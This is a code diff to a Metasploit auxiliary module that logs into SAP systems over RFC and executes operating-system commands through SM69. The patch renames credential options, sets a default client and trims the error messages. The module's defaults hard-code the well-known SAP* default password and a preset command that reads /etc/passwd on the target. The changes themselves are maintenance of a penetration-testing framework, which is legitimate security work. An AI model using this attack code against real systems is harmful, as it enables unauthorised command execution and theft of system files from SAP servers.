@@ -27,14 +27,15 @@ class Metasploit4 < Msf::Auxiliary
       },
       'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
       'Author'         => [ 'nmonkee' ],
-      'License'        => BSD_LICENSE
+      'License'        => BSD_LICENSE,
+      'DefaultOptions' => { 'CLIENT' => '000' }
     )
 
     register_options(
       [
         Opt::RPORT(3342),
-        OptString.new('USER', [true, 'Username', 'SAP*']),
-        OptString.new('PASS', [true, 'Password', '06071992']),
+        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+        OptString.new('PASSWORD', [true, 'Password', '06071992']),
         OptString.new('CMD', [true, 'Command Name as in SM69', 'CAT']),
         OptString.new('PARAM', [true, 'Command Parameters', '/etc/passwd']),
         OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
@@ -42,8 +43,8 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def run_host(rhost)
-    user = datastore['USER']
-    pass = datastore['PASS']
+    user = datastore['USERNAME']
+    pass = datastore['PASSWORD']
 
     unless datastore['CLIENT'] =~ /^\d{3}\z/
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
@@ -51,7 +52,7 @@ class Metasploit4 < Msf::Auxiliary
 
     os = datastore['OS']
 
-    exec_CMD(user,client,pass,rhost,datastore['rport'], datastore['CMD'], datastore['PARAM'], os)
+    exec_CMD(user,datastore['CLIENT'],pass,rhost,datastore['rport'], datastore['CMD'], datastore['PARAM'], os)
   end
 
   def exec_CMD(user, client, pass, rhost, rport, cmd, param, os)
@@ -68,10 +69,10 @@ class Metasploit4 < Msf::Auxiliary
                   })
         print data
       rescue NWError => e
-        print_error("#{rhost}:#{rport} [SAP] FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
+        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
       end
     rescue NWError => e
-      print_error("#{rhost}:#{rport} [SAP] exec_CMD - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
+      # Catch exception to allow aux scanner to continue
     ensure
       if conn
         conn.disconnect
